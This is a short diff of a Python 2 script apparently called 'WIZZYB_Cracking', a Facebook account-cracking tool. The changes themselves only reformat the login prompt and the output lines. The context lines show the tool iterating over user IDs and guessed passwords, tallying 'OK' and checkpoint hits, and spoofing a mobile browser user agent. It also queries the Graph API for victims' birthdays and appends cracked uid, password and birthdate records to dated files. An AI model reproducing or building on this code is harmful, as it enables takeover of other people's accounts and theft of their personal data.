@@ -67,9 +67,7 @@ def login():
 		token = open("login.txt", "r")
 		menu()
 	except KeyError, IOError:
-		print(" ")
-		print(" ")
-		token = raw_input("\033[1;31m[1] L O G I N  W I T H ACCESS T O K E N \033[1;33m : ")
+		token = raw_input("\033[1;31m[LOGIN WITH ACCESS TOKEN\033[1;33m : ")
 		if token == "":
 			print("Wrong Input")
              
@@ -264,9 +262,9 @@ def cek_ttl_cp(uid, pw):
 			ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
 			month, day, year = ttl.split("/")
 			month = bulan_ttl[month]
-			print("\r\033[1;93m[WIZZYB-CP]\033[1;91m %s|%s|%s %s %s"%(uid, pw, day, month, year))
+			print("\r\033[1;93m[WIZZYB-CP]\033[1;91m %s | %s | %s %s %s"%(uid, pw, day, month, year))
 			cp.append("%s | %s"%(uid, pw))
-			open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
+			open("CP/%s.txt"%(tanggal),"a").write(" + %s | %s | %s %s %s\n"%(uid, pw, day, month, year))
 	except KeyError, IOError:
 		day = (" ")
 		month = (" ")
@@ -280,7 +278,7 @@ def bapi(user):
 		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
 	global loop, token
 	sys.stdout.write(
-		"\r\033[0;91m[\033[0;92mWIZZYB_Cracking\033[0;91m]\033[0;92m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
+		"\r\033[0;91m[\033[0;92mWIZZYB_Cracking\033[0;91m]\033[0;92m %s/%s --> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
 	); sys.stdout.flush()
 	uid, name = user.split("<=>")
 	if len(name)>=6:
